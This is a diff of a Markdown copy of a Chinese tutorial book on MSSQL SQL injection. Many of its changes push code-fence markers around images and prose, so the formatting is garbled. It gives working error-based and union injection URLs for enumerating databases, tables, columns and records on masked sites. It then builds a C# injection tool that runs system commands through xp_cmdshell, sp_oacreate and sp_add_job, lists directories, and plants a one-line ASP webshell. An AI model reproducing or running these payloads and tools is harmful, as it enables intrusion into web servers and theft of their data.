@@ -6089,40 +6089,40 @@ and (select top 1 cast([name] as nvarchar(4000)) from (select top N dbid,name fr
 
 ```sql
 http://www.xxx.cn/Zlfb/Information/Information_View.aspx?ContentId=542' and (select char(94)%2Bcast(count(name) as nvarchar(4000))%2Bchar(94) from [master]..[sysdatabases])>0--
-```
-
-返回结果如图 28 所示，说明存在 9 个可用的数据库。
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_152_0.png)
 
+```
+
+返回结果如图 28 所示，说明存在 9 个可用的数据库。
 猜解第一个数据库名字：
 
 ```sql
 http://www.xxx.cn/Zlfb/Information/Information_View.aspx?ContentId=542' and (select top 1 cast([name] as nvarchar(4000)) from (select top 1 dbid,name from [master]..[sysdatabases] order by [dbid]) t order by [dbid] desc)>0--
-```
-
-返回结果如图 29 所示，第一个数据库名字“master”。
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_152_1.png)
 
+```
+
+返回结果如图 29 所示，第一个数据库名字“master”。
 猜解第八个数据库名字：
 
 ```sql
 http://www.xxx.cn/Zlfb/Information/Information_View.aspx?ContentId=542' and (select top 8 cast([name] as nvarchar(4000)) from (select top 8 dbid,name from [master]..[sysdatabases] order by [dbid]) t order by [dbid] desc)>0--
-```
-
-返回结果如图 30 所示，第八个数据库名字“jyscic”。
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_153_0.png)
 
+
+![](img/570f1beedc971b43bae0a626f1f96e78_153_1.png)
+
+```
+
+返回结果如图 30 所示，第八个数据库名字“jyscic”。
 图30 第八个数据库的名字
 
 ###### 猜解数据库中的数据表
 
 在得到了某个数据库以后，需要猜解数据库中的数据表有哪些，有没有我们比较关心的，如存储管理员信息的表等。每个数据库内都有一个系统表——sysobjects 数据表。sysobjects 数据表存放该数据库内创建的所有对象信息，如数据表、日志、规则、存储过程等，每个对象的信息在 sysobjects 数据表中占一行。我们注入中常用的字段有 Name（对象名）、id（对象 ID）、xtype（对象类型），在查询分析器里查看 poison 数据库里面有哪些数据表使用 `select name from poison..sysobjects where xtype='u'`，如图 31 所示。
-
-![](img/570f1beedc971b43bae0a626f1f96e78_153_1.png)
-
 图31 poison数据库中的数据表
 
 得到 database_name 数据库中表的个数：
@@ -6141,32 +6141,32 @@ and (select top 1 cast([name] as nvarchar(4000)) from (select top N name from [d
 
 ```sql
 http://www.xxx.cn/Zlfb/Information/Information_View.aspx?ContentId=542' and (select char(94)%2Bcast(count(name) as nvarchar(4000))%2Bchar(94) from [jyscic]..[sysobjects] where xtype='u')>0--
-```
-
-返回结果如图 32 所示，说明 jyscic 数据库存在 266 个可用的数据表。
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_153_2.png)
 
+```
+
+返回结果如图 32 所示，说明 jyscic 数据库存在 266 个可用的数据表。
 图32 存在266个可用数据表
 
 ```sql
 http://www.xxx.cn/Zlfb/Information/Information_View.aspx?ContentId=542' and (select top 1 cast([name] as nvarchar(4000)) from (select top 1 name from [jyscic]..[sysobjects] where xtype='u' order by [name]) t order by [name] desc)>0--
-```
-
-返回结果如图 33 所示，说明 jyscic 数据库第一个数据表为“Credit_Operator_log”。
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_154_0.png)
 
+```
+
+返回结果如图 33 所示，说明 jyscic 数据库第一个数据表为“Credit_Operator_log”。
 图33 第一个数据表为 Credit_Operator_log
 
 ```sql
 http://www.xxx.cn/Zlfb/Information/Information_View.aspx?ContentId=542' and (select top 1 cast([name] as nvarchar(4000)) from (select top 10 name from [jyscic]..[sysobjects] where xtype='u' order by [name]) t order by [name] desc)>0--
-```
-
-返回结果如图 34 所示，说明 jyscic 数据库第十个数据表为“d_blgc”。我们变换 top N 中的 N 查询出所有数据表名了。
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_154_1.png)
 
+```
+
+返回结果如图 34 所示，说明 jyscic 数据库第十个数据表为“d_blgc”。我们变换 top N 中的 N 查询出所有数据表名了。
 图34 第十个数据表为 d_blgc
 
 ###### 猜解列名
@@ -6195,42 +6195,42 @@ and (select top 1 cast([name] as nvarchar(4000)) from (select top N name from [d
 
 ```sql
 http://www.xxx.cn/Zlfb/Information/Information_View.aspx?ContentId=542' and (select char(94)%2Bcast(id as nvarchar(4000))%2Bchar(94) from [jyscic]..[sysobjects] where xtype='u' and name='Credit_Operator_log')>0--
-```
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_155_0.png)
 
+```
 图35 Credit_Operator_log表的对应ID
 
 返回结果如图 35 所示，说明 Credit_Operator_log 表的对应 ID 为“532196946”。
 
 ```sql
 http://www.xxx.cn/Zlfb/Information/Information_View.aspx?ContentId=542' and (select char(94)%2Bcast(count(name) as nvarchar(4000))%2Bchar(94) from [jyscic]..[syscolumns] where id='532196946')>0--
-```
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_155_1.png)
 
+```
 图36 Credit_Operator_log表有9个字段
 
 返回结果如图 36 所示，说明 Credit_Operator_log 表中有 9 个字段。
 
 ```sql
 http://www.xxx.cn/Zlfb/Information/Information_View.aspx?ContentId=542' and (select top 1 cast([name] as nvarchar(4000)) from (select top 1 name from [jyscic]..[syscolumns] where id='532196946' order by [name]) t order by [name] desc)>0--
-```
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_155_2.png)
 
+```
 图37 Credit_Operator_log表中有“AfterXml”字段
 
 返回结果如图 37 所示，说明 Credit_Operator_log 表中有一个“AfterXml”字段。
 
 ```sql
 http://www.xxx.cn/Zlfb/Information/Information_View.aspx?ContentId=542' and (select top 1 cast([name] as nvarchar(4000)) from (select top 9 name from [jyscic]..[syscolumns] where id='532196946' order by [name]) t order by [name] desc)>0--
-```
-
-返回结果如图 38 所示，说明 Credit_Operator_log 表中有一个“OperatorType”字段。
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_156_0.png)
 
+```
+
+返回结果如图 38 所示，说明 Credit_Operator_log 表中有一个“OperatorType”字段。
 图38 Credit_Operator_log 表中有“OperatorType”字段
 
 ###### 猜解记录内容
@@ -6251,22 +6251,22 @@ and (select top 1 cast([id] as nvarchar(4000))%2Bchar(124)%2Bcast([column1] as n
 
 ```sql
 http://www.xxx.cn/Zlfb/Information/Information_View.aspx?ContentId=542' and (select char(94)%2Bcast(count(*) as nvarchar(4000))%2Bchar(94) from Credit_Operator_log)>0--
-```
-
-返回结果如图 39 所示，说明 Credit_Operator_log 表中存在 7 条记录。
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_156_1.png)
 
+```
+
+返回结果如图 39 所示，说明 Credit_Operator_log 表中存在 7 条记录。
 图39 Credit_Operator_log 表存在 7 条记录
 
 ```sql
 http://www.xxx.cn/Zlfb/Information/Information_View.aspx?ContentId=542' and (select top 1 cast([id] as nvarchar(4000))%2Bchar(124)%2Bcast([afterxml] as nvarchar(4000)) from (select top 2 id,afterxml from [jyscic]..[credit_operator_log] where 1=1 order by 1) t order by 1 desc)>0--
-```
-
-返回结果如图 40 所示，得到 Credit_Operator_log 表中第二条记录 AfterXml 字段的内容。
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_157_0.png)
 
+```
+
+返回结果如图 40 所示，得到 Credit_Operator_log 表中第二条记录 AfterXml 字段的内容。
 图40 第二条记录 AfterXml 字段的内容
 
 ## 2.4 union 联合查询注入攻击
@@ -6288,10 +6288,10 @@ http://www.xxx.cn/Zlfb/Information/Information_View.aspx?ContentId=542' and (sel
 
 ```sql
 http://www.xxx.cn/list.aspx?id=zzfw' order by 10--
-```
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_157_1.png)
 
+```
 返回如图 41 所示，返回错误页面，说明要匹配的字段数小于 10。继续提交：
 
 图41 字段数小于10
@@ -6354,40 +6354,40 @@ http://www.xxx.cn/list.aspx?id=zzfw' and 1=2 union select 1,2,3,4,5--
 
 ```text
 http://www.xxx.cn/list.aspx?id=zzfw' and 1=2 union select 1,2,3,4,5,6--
-```
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_158_0.png)
 
-图42 字段数大于等于5
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_158_1.png)
 
-图43 字段数大于1
-
-返回正确页面，如图44所示，说明要匹配的字段数等于 6。
-
-图44中有些地方显示了数字 3，这个数字代表什么呢？我们把上面的语句 `http://www.xxx.cn/list.aspx?id=zzfw' and 1=2 union select 1,2,3,4,5,6--` 串中的 3，换成 user 提交，返回如图45所示。
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_159_0.png)
 
-我们分析图45中显示的内容，在页面中 3 的位置显示的是当前数据库用户。这就是 union 查询的方便之处。
-
-## 2.4.2 union 获取基本信息
-
-提交 `http://www.xxx.cn/list.aspx?id=zzfw' and 1=2 union ...`
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_159_1.png)
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_159_2.png)
 
+
+![](img/570f1beedc971b43bae0a626f1f96e78_160_0.png)
+
+```
+图42 字段数大于等于5
+图43 字段数大于1
+
+返回正确页面，如图44所示，说明要匹配的字段数等于 6。
+
+图44中有些地方显示了数字 3，这个数字代表什么呢？我们把上面的语句 `http://www.xxx.cn/list.aspx?id=zzfw' and 1=2 union select 1,2,3,4,5,6--` 串中的 3，换成 user 提交，返回如图45所示。
+我们分析图45中显示的内容，在页面中 3 的位置显示的是当前数据库用户。这就是 union 查询的方便之处。
+
+## 2.4.2 union 获取基本信息
+
+提交 `http://www.xxx.cn/list.aspx?id=zzfw' and 1=2 union ...`
 `select 1,2,@@version,4,5,6--`，返回结果如图46所示，得到数据库版本信息。
 
 提交 `http://www.xxx.cn/list.aspx?id=zzfw' and 1=2 union select 1,2,db_name(),4,5,6--`，返回结果如图47所示，得到数据库名称“DBWeb”。
 
 提交 `http://www.xxx.cn/list.aspx?id=zzfw' and 1=2 union select 1,2,host_name(),4,5,6--`，返回结果如图48所示，得到当前连接的客户端名称“USER-KQGG4SMQD9”。
-
-![](img/570f1beedc971b43bae0a626f1f96e78_160_0.png)
-
 图48 得到当前连接的客户端名称　　图49 得到数据库服务器名称
 
 提交 `http://www.xxx.cn/list.aspx?id=zzfw' and 1=2 union select 1,2,@@servername,4,5,6--`，返回结果如图49所示，得到数据库服务器名称“WebDATA_MAIN”。和上面当前连接的客户端名称“USER-KQGG4SMQD9”不同，Web 服务器和数据库服务器不是同一台机器，也就是常说的 Web 和 data 分离。
@@ -6430,10 +6430,13 @@ http://www.xxx.tw/news/news1.asp?no=41;insert into [poopoo poo]([resulttxt]) exe
 http://www.xxx.tw/news/news1.asp?no=41 and 1=2 union all select cast(count(*) as nvarchar(4000)),null,null from [poopoo poo]---
 
 http://www.xxx.tw/news/news1.asp?no=41 and 1=2 union all select top 1 cast(resulttxt as nvarchar(4000)),null,null from (select top 1 resulttxt from (select top 1 id,resulttxt from [poopoo poo] where resulttxt is not null order by 1) t order by 1 desc)t---
-```
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_161_0.png)
 
+
+![](img/570f1beedc971b43bae0a626f1f96e78_161_1.png)
+
+```
 返回结果如图50所示。
 
 ## 3 MSSQL2000注入工具代码实现
@@ -6441,9 +6444,6 @@ http://www.xxx.tw/news/news1.asp?no=41 and 1=2 union all select top 1 cast(resul
 为了我们更好地实现程序功能，把重点放在代码实现上，这里我已经设计好了程序的主界面，我们只需在相应的地方添加功能代码即可。
 
 实例1是我已经设计好的程序，大家只需在这个基础上添加功能代码实现相应功能即可（完整代码参见光盘实例1），界面如图51所示。
-
-![](img/570f1beedc971b43bae0a626f1f96e78_161_1.png)
-
 #### 3.1 判断 MSSQL 数据库版本
 
 MSSQL2000 和 MSSQL2005 不同的版本利用方法是不同的。首先我们需要判断 MSSQL 的版本。前面我们介绍过如何去判断注入点的数据库类型。在我们检测出是 MSSQL 数据库后，还要继续去判断 MSSQL 的版本信息。
@@ -6537,10 +6537,13 @@ if (getHttpContent(my_checkUrl + " and 1=1").Contains(m_KeyWord) && !getHttpCont
 }
 ......
 （详细代码参见实例2源程序）
-```
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_163_0.png)
 
+
+![](img/570f1beedc971b43bae0a626f1f96e78_164_0.png)
+
+```
 图52 运行界面
 
 里面有一句代码 `getHttpContent(my_checkUrl + " and user=0--").Contains("转换为数据类型为 int")`，意思是当我们访问 URL 加上 `and user=0--` 返回的信息中包含“转换为数据类型为 int”时，我们就确定错误提示是开启的。getHttpContent() 函数是获取网页的源代码。最后按 Ctrl+F5 编译运行。在注入点处输入需要检测的 URL。第一步单击“开始检测”按钮，检测出存在注入漏洞，数据库为 “mssql” 数据库，然后程序会自行判断 MSSQL 的版本以及错误提示是否开启，如图52所示。
@@ -6556,9 +6559,6 @@ if (getHttpContent(my_checkUrl + " and 1=1").Contains(m_KeyWord) && !getHttpCont
 我们的程序该如何去实现这样的功能呢？首先我们构造需要的 URL，然后根据错误提示的信息直接取得我们需要的数据。
 
 例如我们想得到当前 SQL Server 的版本，提交 `http://stuic.xxx.cn/News.aspx?id=861 and @@version>0--`，返回结果如图 53 所示。
-
-![](img/570f1beedc971b43bae0a626f1f96e78_164_0.png)
-
 我们需要的版本信息包含在“值”和“转换为数据类型为”两个字符串之间，程序只要通过字符串操作取出“值”和“转换为数据类型为”之间的值，就是我们需要的版本信息。
 
 我们定义一个函数 `getErrorContent(string m_HttpUrl, string firstString, string EndString)`，这个函数的作用就是访问 `m_HttpUrl` 指定的 URL 地址，返回 `firstString` 和 `EndString` 之间的 HTML 代码。例如我们提交 `http://stuic.xxx.cn/News.aspx?id=861 and user>0--`，将会返回“将 nvarchar 值 'homePage' 转换为数据类型为 int 的列时发生语法错误”，`getErrorContent` 这个函数的作用就是得到字符串“值”和字符串“转换为数据类型为”之间的内容，即“homePage”。代码如下：
@@ -6720,6 +6720,9 @@ private void toolStripButton_getInfo_Click(object sender, EventArgs e)
     delHTStartGuess.BeginInvoke(callBackWhenDone, null);
 }
 // 详细代码参见实例3源程序
+
+![](img/570f1beedc971b43bae0a626f1f96e78_168_0.png)
+
 ```
 
 最后按 Ctrl+F5 编译运行。在注入点处输入需要检测的 URL。第一步单击“开始检测”按钮，检测出存在注入漏洞，数据库为“mssql2000 with error”，错误提示开启下的 MSSQL2000。然后我们在下面的列表框中选中需要猜解的基本信息，单击“获取信息”按钮，返回结果如图 54 所示。
@@ -6727,9 +6730,6 @@ private void toolStripButton_getInfo_Click(object sender, EventArgs e)
 ##### 3.2.2 获取数据
 
 前面介绍过 MS SQL Server 里面可以有很多不同的数据库。MS SQL Server 默认安装了 master、model、msdb、northwind、pubs、tempdb 这 6 个数据库，其中 northwind、pubs 是系统自带的实例数据库，其它都是系统数据库。数据库名称在 master 数据库中的 sysdatabases 数据表中。
-
-![](img/570f1beedc971b43bae0a626f1f96e78_168_0.png)
-
 图 54 获取到的信息
 
 数据首先就要明确猜解哪个数据库里的数据。在“获取信息”的 `getInformation()` 函数中，我们通过遍历 sysdatabases 表得到所有可用的数据库名。我们在猜解数据表前要先选择好要猜解的数据库名。代码如下：
@@ -6779,18 +6779,18 @@ private void toolStripButton_getTables_Click(object sender, EventArgs e)
     AsyncCallback callBackWhenDone = new AsyncCallback(EndGetTable); // EndGetTable 异步调用返回后自动执行的代码
     delHTStartGuess.BeginInvoke(callBackWhenDone, null);
 }
-```
-
-最后按 `Ctrl+F5` 编译运行。在注入点处输入需要检测的 URL。第一步单击“开始检测”按钮，检测出存在注入漏洞，数据库为“mssql2000 with error”数据库（错误提示开启下的 MSSQL2000）；然后在下面的列表框中选中需要猜解的基本信息，单击“获取信息”按钮，得到数据库基本信息；然后在“选择数据库”后面的下拉列表框中选择当前数据库“onlineclass”，切换到“获取数据”选项页中，单击“获取表名”按钮，开始猜解数据库“onlineclass”的用户表，最后返回结果如图55所示。
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_169_0.png)
 
-图55 猜解数据库“onlineclass”的用户表
-
-猜解列名及数据内容和猜解表名的过程是一样的。前面我们已经介绍过猜解数据的原理和猜解数据库表名的代码，我们可以参考猜解表名的代码来实现猜解列名和记录内容的功能，最后完善的功能如图56所示。
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_169_1.png)
 
+```
+
+最后按 `Ctrl+F5` 编译运行。在注入点处输入需要检测的 URL。第一步单击“开始检测”按钮，检测出存在注入漏洞，数据库为“mssql2000 with error”数据库（错误提示开启下的 MSSQL2000）；然后在下面的列表框中选中需要猜解的基本信息，单击“获取信息”按钮，得到数据库基本信息；然后在“选择数据库”后面的下拉列表框中选择当前数据库“onlineclass”，切换到“获取数据”选项页中，单击“获取表名”按钮，开始猜解数据库“onlineclass”的用户表，最后返回结果如图55所示。
+图55 猜解数据库“onlineclass”的用户表
+
+猜解列名及数据内容和猜解表名的过程是一样的。前面我们已经介绍过猜解数据的原理和猜解数据库表名的代码，我们可以参考猜解表名的代码来实现猜解列名和记录内容的功能，最后完善的功能如图56所示。
 图56 猜解列名及数据内容
 
 具体的实现代码大家参照光盘实例4。
@@ -6901,18 +6901,21 @@ private void button_run_Click(object sender, EventArgs e)
     AsyncCallback callBackWhenDone = new AsyncCallback(EndexecCommand);
     delHTStartGuess.BeginInvoke(callBackWhenDone, null);
 }
-```
-
-（详细代码参见光盘实例5源程序）
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_172_0.png)
 
-图57 利用 xp_cmdshell 执行命令
-
-最后按 `Ctrl+F5` 编译运行。在注入点处输入需要检测的 URL。第一步选好注入类型，第二步在执行组件后面选择要执行命令的方法，我们选择 `xp_cmdshell`，单击“执行命令”按钮。
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_172_1.png)
 
+
+![](img/570f1beedc971b43bae0a626f1f96e78_172_2.png)
+
+```
+
+（详细代码参见光盘实例5源程序）
+图57 利用 xp_cmdshell 执行命令
+
+最后按 `Ctrl+F5` 编译运行。在注入点处输入需要检测的 URL。第一步选好注入类型，第二步在执行组件后面选择要执行命令的方法，我们选择 `xp_cmdshell`，单击“执行命令”按钮。
 图58 利用 sp_oacreate 执行命令
 
 返回结果如图57所示。
@@ -6920,9 +6923,6 @@ private void button_run_Click(object sender, EventArgs e)
 选择 `sp_oacreate`，单击“执行命令”按钮，返回结果如图58所示。
 
 选择 `sp_add_job`，单击“执行命令”按钮，返回结果如图59所示。
-
-![](img/570f1beedc971b43bae0a626f1f96e78_172_2.png)
-
 图59 利用 sp_add_job 执行命令
 
 ##### 3.2.4 列目录
@@ -6972,14 +6972,14 @@ private void button_dirtree_Click(object sender, EventArgs e)
     AsyncCallback callBackWhenDone = new AsyncCallback(EnddirTree);
     delHTStartGuess.BeginInvoke(callBackWhenDone, null);
 }
+
+![](img/570f1beedc971b43bae0a626f1f96e78_173_0.png)
+
 ```
 
 （详细代码参见光盘实例6源程序）
 
 最后按 `Ctrl+F5` 编译运行。在注入点处输入需要检测的 URL。第一步单击“开始检测”按钮，检测出存在注入漏洞，数据库为“mssql2000 with error”数据库（错误提示开启下的 MSSQL2000）；然后切换到“列目录”选项页，填好要列的目录路径（`c:\`），单击“列目录”按钮，成功列出 `c:\` 下的目录结构，返回结果如图60所示。
-
-![](img/570f1beedc971b43bae0a626f1f96e78_173_0.png)
-
 ##### 3.2.5 获取 WebShell
 
 前面我们介绍了两种写文件的方法：一种是在 `sysadmin` 权限下利用 `sp_makewebtask` 存储过程直接在 Web 目录里写入一句话的 WebShell；另一种是在 `db_owner` 权限下通过备份数据库获得 WebShell。
@@ -7043,18 +7043,18 @@ private void button_WebShell_Click(object sender, EventArgs e)
 // EndGetRecodes 异步调用返回后自动执行的代码
 delHTStartWrite.BeginInvoke(callBackWhenDone, null);
 }
+
+![](img/570f1beedc971b43bae0a626f1f96e78_175_0.png)
+
+
+![](img/570f1beedc971b43bae0a626f1f96e78_175_1.png)
+
 ```
 
 （详细代码参见光盘实例 7 源程序）
 
 最后按 Ctrl+F5 编译运行。在注入点处输入需要检测的 URL。第一步单击“开始检测”按钮，检测出存在注入漏洞，数据库为“mssql2000 with error”数据库，错误提示开启下的 MSSQL2000，已知网站的物理路径为 `C:\Inetpub\www\wwwroot`，在“执行方法”中选择“sp_makeWebtask”，单击“获取WebShell”按钮，在 `C:\Inetpub\www\wwwroot` 目录下成功写入包含 `<%execute request(chr(35))%>` 代码的 asp 文件 WebShell1.asp，返回结果如图 61 所示。
-
-![](img/570f1beedc971b43bae0a626f1f96e78_175_0.png)
-
 图 61 利用 sp_makeWebtask 成功写入文件
-
-![](img/570f1beedc971b43bae0a626f1f96e78_175_1.png)
-
 图 62 利用 backup_log 成功写入文件
 
 在“执行方法”中选择“backup_log”，单击“获取 WebShell”按钮，在 `C:\Inetpub\www\wwwroot` 目录下成功写入包含 `<%execute request(chr(35))%>` 代码的 asp 文件 WebShell2.asp，返回结果如图 62 所示。
@@ -7194,12 +7194,12 @@ private void toolStripButton_getInfo_Click(object sender, EventArgs e)
     AsyncCallback callBackWhenDone = new AsyncCallback(EndGetInformation); // EndGetInformation() 异步调用返回后自动执行的代码
     delHTStartGuess.BeginInvoke(callBackWhenDone, null);
 }
-```
-
-最后按 Ctrl+F5 编译运行。在注入点处输入需要检测的 URL。单击“开始检测”按钮，检测出存在注入漏洞，数据库为“mssql2000”数据库，在字段数量里面填好匹配的 union 字段 3，在显示位置里面填好显示信息的字段位置 2，然后在下面的列表框中选中需要猜解的基本信息，单击“获取信息”按钮，返回结果如图 63 所示。
 
 ![](img/570f1beedc971b43bae0a626f1f96e78_178_0.png)
 
+```
+
+最后按 Ctrl+F5 编译运行。在注入点处输入需要检测的 URL。单击“开始检测”按钮，检测出存在注入漏洞，数据库为“mssql2000”数据库，在字段数量里面填好匹配的 union 字段 3，在显示位置里面填好显示信息的字段位置 2，然后在下面的列表框中选中需要猜解的基本信息，单击“获取信息”按钮，返回结果如图 63 所示。
 图 63 获取到的系统信息
 
 ##### 3.3.2 执行命令
